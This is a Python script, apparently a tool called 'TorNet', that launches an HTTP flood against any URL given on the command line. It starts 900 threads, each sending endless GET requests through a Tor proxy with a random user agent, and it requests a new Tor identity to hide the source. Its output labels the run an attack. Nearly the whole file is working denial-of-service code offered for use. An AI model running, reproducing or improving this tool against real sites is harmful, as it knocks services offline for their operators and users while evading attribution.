from colorama import Fore, init
import requests, threading, time, sys
from os import system, name
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent 

ua = UserAgent()
random_user_agent = ua.random

white = Fore.LIGHTWHITE_EX
green = Fore.LIGHTGREEN_EX
magenta = Fore.LIGHTMAGENTA_EX

def change_tor_identity(tor_password):
    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Your password has been added :{Fore.LIGHTRED_EX} {tor_password}')
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=tor_password)
        controller.signal(Signal.NEWNYM)
        print(f"{Fore.LIGHTMAGENTA_EX}[+]{Fore.LIGHTWHITE_EX} TOR IP change completed")

init()
                                            

def check_website(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} STATUS :{Fore.LIGHTGREEN_EX} {response.status_code}")
        else:
            print(f"{Fore.LIGHTRED_EX}[-]{Fore.LIGHTWHITE_EX} STATUS :{Fore.LIGHTRED_EX} {response.status_code}")
    except requests.exceptions.RequestException as e:
        pass


def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')


clear()

def title():
    print(
        f"""
                    {green}=-----   
                   =++==     
                  +*++       
                 =-*#
                {white} %:+*@
              @%*::-={magenta}+%{white}@
{magenta} /$$$$$$$$  {white} @*:..::{magenta}=-+={white}@@             {magenta} /$$   /$$             /$$
{magenta}|__  $$__/ {white}@#:.::..:---{magenta}*++{white}@           {magenta} | $$$ | $$            | $$
   {magenta}| $$    {white}@::-..:::=--{magenta}#***{white}@ {magenta}  /$$$$$$ | $$$$| $$  /$$$$$$  /$$$$$$
   {magenta}| $$   {white}@#:=.:-..:--{magenta}*#***{white}@{magenta}  /$$__  $$| $$ $$ $$ /$$__  $$|_  $$_/
   {magenta}| $$    {white}@:=:-..-:{magenta}+=*%###{white}@{magenta} | $$  \__/| $$  $$$$| $$$$$$$$  | $$
   {magenta}| $$    {white}@#:--::::{magenta}*-*%##{white}@ {magenta} | $$      | $$\  $$$| $$_____/  | $$ /$$
   {magenta}| $$      {white}@#-=--:{magenta}+%##{white}@@ {magenta}  | $$      | $$ \  $$|  $$$$$$$  |  $$$$/
   {magenta}|__/     {white}   @@@@@@@@     {magenta} |__/      |__/  \__/ \_______/   \___/{Fore.LIGHTWHITE_EX}"""
    )
def main():
    title()
    if len(sys.argv) != 3:
        print(f"  ════╦═════════════════════════════════════════════════════════╦════")
        print(f"      ║{Fore.LIGHTRED_EX} Usage:{Fore.LIGHTGREEN_EX} python3 main.py <URL> <password_tor>{Fore.LIGHTWHITE_EX}             ║    ")
        print(f"      ╚═════════════════════════════════════════════════════════╝    ")

        print(
            f"""
 ╔═════════════════════════════════════════════════════════╗
 ║{Fore.LIGHTMAGENTA_EX} •{Fore.LIGHTWHITE_EX} password_tor   >>>{Fore.LIGHTGREEN_EX} Your TOR password{Fore.LIGHTWHITE_EX}                  ║
 ║    │{Fore.LIGHTRED_EX} tor --hash-password hell0{Fore.LIGHTWHITE_EX}                          ║
 ║    │{Fore.LIGHTRED_EX}  16:<HASH>{Fore.LIGHTWHITE_EX}                                         ║
 ║    └{Fore.LIGHTRED_EX} python3 main.py <URL> hell0{Fore.LIGHTBLACK_EX} <- Password{Fore.LIGHTWHITE_EX}            ║
 ║{Fore.LIGHTMAGENTA_EX} •{Fore.LIGHTWHITE_EX} url            >>>{Fore.LIGHTGREEN_EX} Put any URL{Fore.LIGHTWHITE_EX}                        ║
 ║    └{Fore.LIGHTRED_EX} https://google.com/{Fore.LIGHTWHITE_EX}                                ║
 ╚═════════════════════════════════════════════════════════╝
            """
        )

        sys.exit(1)

    url = sys.argv[1]
    tor_password = sys.argv[2]

    print(f'{Fore.LIGHTBLACK_EX}[*]{Fore.LIGHTWHITE_EX} Loading . . . ')
    check_website(url)
    def send_requests():
        try:
            headers = {
                    'User-Agent': random_user_agent
            }
            tor_proxy = {
                    'http': 'socks5h://127.0.0.1:9050',
                    'https': 'socks5h://127.0.0.1:9050'
            }
            while True:
                response = requests.get(url, proxies=tor_proxy, headers=headers)
                print(f"{Fore.LIGHTRED_EX}    ╟{Fore.LIGHTWHITE_EX}    Attack in progress. . .  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTWHITE_EX}   STATUS{Fore.LIGHTYELLOW_EX} →{Fore.LIGHTGREEN_EX} {response.status_code}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}    ╟{Fore.LIGHTRED_EX}    Connection failed  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTBLACK_EX}   {e}")

    threads = []
    change_tor_identity(tor_password)
    for i in range(900):
        thread = threading.Thread(target=send_requests)
        time.sleep(0.1)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

main()